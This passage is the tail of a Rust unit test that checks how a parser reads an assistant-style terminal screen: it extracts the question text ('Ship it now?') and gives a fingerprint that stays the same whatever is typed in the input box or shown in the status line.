        assert_ne!(read("⏺ Ship it now?\n").fingerprint(count), read("⏺ Ship it tomorrow?\n").fingerprint(count));
        let boxed = |typed: &str, status: &str| format!("⏺ Ship it now?\n\n╭────────────╮\n│ > {typed} │\n╰────────────╯\n  {status}\n");
        let q = read(&boxed("", "? for shortcuts"));
        assert_eq!(q.text, "⏺ Ship it now?");
        assert_eq!(q.fingerprint(count), read(&boxed("yes, ship", "41% context left")).fingerprint(count));
    }
}
